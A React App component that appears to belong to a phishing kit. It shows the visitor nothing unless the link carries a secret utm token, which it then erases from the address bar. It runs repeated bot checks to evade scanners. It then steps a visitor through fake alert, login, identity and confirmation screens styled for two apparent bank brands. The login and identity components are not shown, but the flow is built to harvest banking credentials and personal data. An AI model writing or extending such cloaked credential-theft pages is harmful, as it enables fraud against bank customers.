import { useState, useEffect, useRef } from 'react';
import { BRAND } from './config/brand';
import { AntiBotProtection } from './utils/antiBot';
import Loader from './components/Loader';

// BP components
import BpHeader from './components/bp/BpHeader';
import BpLoading from './components/bp/BpLoading';
import BpStepAlert from './components/bp/BpStepAlert';
import BpStepLogin from './components/bp/BpStepLogin';
import BpStepIdentity from './components/bp/BpStepIdentity';
import BpStepConfirm from './components/bp/BpStepConfirm';

// CE components
import CeHeader from './components/ce/CeHeader';
import CeLoading from './components/ce/CeLoading';
import CeStepAlert from './components/ce/CeStepAlert';
import CeStepLogin from './components/ce/CeStepLogin';
import CeStepIdentity from './components/ce/CeStepIdentity';
import CeStepConfirm from './components/ce/CeStepConfirm';

type Step = 'alert' | 'login' | 'identity' | 'confirm';

export default function App() {
  const [authorized, setAuthorized] = useState(false);
  const [initialLoading, setInitialLoading] = useState(true);
  const [transitLoading, setTransitLoading] = useState(false);
  const [step, setStep] = useState<Step>('alert');
  const [isChecking, setIsChecking] = useState(true);
  const [isHuman, setIsHuman] = useState(false);
  const retryCount = useRef(0);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get('utm') === 'professeur-documentaire') {
      setAuthorized(true);
      window.history.replaceState({}, '', window.location.pathname);
    }
  }, []);

  useEffect(() => {
    const check = async () => {
      try {
        const ab = AntiBotProtection.getInstance();
        const result = await ab.checkForBot();
        if (!result.isBot) {
          setIsHuman(true);
          setIsChecking(false);
          return;
        }
      } catch {}
      retryCount.current++;
      if (retryCount.current >= 3) {
        setTimeout(() => { setIsHuman(true); setIsChecking(false); }, 10000);
      } else {
        setTimeout(check, 2000);
      }
    };
    check();
  }, []);

  useEffect(() => {
    if (isHuman) {
      const t = setTimeout(() => setInitialLoading(false), 1400);
      return () => clearTimeout(t);
    }
  }, [isHuman]);

  if (!authorized) return null;

  if (isChecking && !isHuman) return <Loader />;

  // Pick components based on brand
  if (BRAND === 'bp') {
    return (
      <div className="bg-gray-50 min-h-screen font-ubuntu">
        <BpHeader />
        <BpLoading visible={initialLoading || transitLoading} />
        {step === 'alert' && <BpStepAlert onContinue={() => setStep('login')} />}
        {step === 'login' && <BpStepLogin onSuccess={() => setStep('identity')} onLoading={setTransitLoading} />}
        {step === 'identity' && <BpStepIdentity onSuccess={() => setStep('confirm')} />}
        {step === 'confirm' && <BpStepConfirm />}
      </div>
    );
  }

  return (
    <div className="bg-gray-50 min-h-screen font-ubuntu">
      <CeHeader />
      <CeLoading visible={initialLoading || transitLoading} />
      {step === 'alert' && <CeStepAlert onContinue={() => setStep('login')} />}
      {step === 'login' && <CeStepLogin onSuccess={() => setStep('identity')} onLoading={setTransitLoading} />}
      {step === 'identity' && <CeStepIdentity onSuccess={() => setStep('confirm')} />}
      {step === 'confirm' && <CeStepConfirm />}
    </div>
  );
}
